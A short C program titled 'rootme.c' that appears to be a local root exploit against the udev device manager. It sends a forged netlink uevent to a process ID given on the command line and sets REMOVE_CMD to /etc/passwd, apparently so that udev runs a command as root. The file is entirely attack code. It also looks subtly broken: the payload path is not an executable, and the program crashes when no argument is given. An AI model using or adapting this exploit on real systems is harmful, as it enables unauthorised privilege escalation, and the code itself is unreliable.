// gcc rootme.c -o rootme
// ./rootme
// segmantation fault 

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/types.h>
#include <linux/netlink.h>

#ifndef NETLINK_KOBJECT_UEVENT
#define NETLINK_KOBJECT_UEVENT 15
#endif

int
main(int argc, char **argv)
{
  int sock;
  char *mp;
  char message[4096];
  struct msghdr msg;
  struct iovec iovector;
  struct sockaddr_nl address;

  memset(&address, 0, sizeof(address));
  address.nl_family = AF_NETLINK;
  address.nl_pid = atoi(argv[1]);
  address.nl_groups = 0;

  msg.msg_name = (void*)&address;
  msg.msg_namelen = sizeof(address);
  msg.msg_iov = &iovector;
  msg.msg_iovlen = 1;

  sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
  bind(sock, (struct sockaddr *) &address, sizeof(address));

  mp = message;
  mp += sprintf(mp, "a@/d") + 1;
  mp += sprintf(mp, "SUBSYSTEM=block") + 1;
  mp += sprintf(mp, "DEVPATH=/dev/foo") + 1;
  mp += sprintf(mp, "TIMEOUT=10") + 1;
  mp += sprintf(mp, "ACTION=remove") +1;
  mp += sprintf(mp, "REMOVE_CMD=/etc/passwd") +1;

  iovector.iov_base = (void*)message;
  iovector.iov_len = (int)(mp-message);

  sendmsg(sock, &msg, 0);

  close(sock);

  return 0;
}
